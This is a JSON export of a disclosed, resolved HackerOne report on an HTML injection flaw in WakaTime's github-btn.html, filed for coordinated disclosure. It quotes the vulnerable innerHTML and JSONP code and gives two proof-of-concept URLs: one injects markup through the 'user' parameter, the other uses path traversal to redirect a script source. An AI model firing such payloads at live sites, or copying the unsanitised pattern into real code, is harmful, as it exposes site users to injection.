{
  "id": 248588,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDg1ODg=",
  "url": "https://hackerone.com/reports/248588",
  "title": "[wakatime.com] HTML Injection github-btn.html",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2017-07-12T08:13:29.162Z",
  "submitted_at": "2017-07-12T08:13:29.162Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "bobrov",
    "url": "/bobrov",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/205/e865d3ffcef54eba49cba80bd59502a347519715_original.jpeg/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 21801,
    "url": "https://hackerone.com/wakatime",
    "handle": "wakatime",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/6t1wy3jbq9kayjwvqbnymavxizfx/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/6t1wy3jbq9kayjwvqbnymavxizfx/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "WakaTime",
      "twitter_handle": "wakatime",
      "website": "https://wakatime.com",
      "about": "Automated metrics about your programming from text editor plugins."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2018-10-19T15:13:45.890Z",
  "bug_reporter_agreed_on_going_public_at": "2018-10-19T07:21:01.345Z",
  "team_member_agreed_on_going_public_at": "2018-10-19T15:13:45.852Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Description\n===\n**Vulnerable parameter:** user\n**Vulnerable script:** https://wakatime.com/static/html/github-btn.html\n**Vulnerable code:**\n```js\n  var params = function () {\n    var vars = [], hash;\n    var hashes = window.location.href.slice(window.location.href.indexOf(\"?\") + 1).split(\"&\");\n    for(var i = 0; i < hashes.length; i++) {\n      hash = hashes[i].split('=');\n      vars.push(hash[0]);\n      vars[hash[0]] = hash[1];\n    }\n    return vars;\n  }()\n  var user = params.user,\n      repo = params.repo,\n      type = params.type,\n ...\n  } else if (type == \"follow\") {\n    mainButton.className += \" github-me\";\n    text.innerHTML = \"Follow @\" + user;\n```\nPoCs\n===\n\n**PoC #1**\nHTML Injection for Chrome, Internet Explorer\n\n```\nhttps://wakatime.com/static/html/github-btn.html#&user=<h1><marquee>HTML<br>HTML<br>HTML<br>HTML<br>HTML<br>HTML<br>&type=follow\n```\n\n**PoC #2**\nUsing this script it is also possible to use DOM Based XSS in Internet Explorer, as I did in these reports #200753 #200826\nBut since the `X-Frame-Options: SAMEORIGIN` header is used for all HTTP responses, this could not be done in this case.\n\nAnother vulns\n===\n\nAlso, this script has potential vulnerabilities using user controlled parameters in the path to the JS script.\nBut for the exploitation it requires additional vulnerability on api.github.com (for example, Open Redirect or user controlled output).\n\n```js\n  function jsonp(path) {\n    var el = document.createElement('script');\n    el.src = path + '?callback=callback';\n    head.insertBefore(el, head.firstChild);\n  }\n...\n  if (type == 'follow') {\n    jsonp('https://api.github.com/users/' + user);\n  } else {\n    jsonp('https://api.github.com/repos/' + user + '/' + repo);\n  }\n```\n**PoC**\n```\nhttps://wakatime.com/static/html/github-btn.html?#&user=../../another/endpoint&repo=../../another/endpoint&type=fork\n```\n**Result**\n```\nhttps://api.github.com/another/endpoint?callback=callback\n```",
  "weakness": {
    "id": 63,
    "name": "Cross-site Scripting (XSS) - DOM"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2018-11-18T07:21:01.432Z",
  "allow_singular_disclosure_after": -165302710.1961584,
  "singular_disclosure_allowed": true,
  "vote_count": 9,
  "voters": [
    "bobrov",
    "ali",
    "johndoe1492",
    "savitar0x01",
    "r3y",
    "eveeez",
    "japz",
    "0xm1racle",
    "thejaguar"
  ],
  "severity": {
    "rating": "low",
    "author_type": "User"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
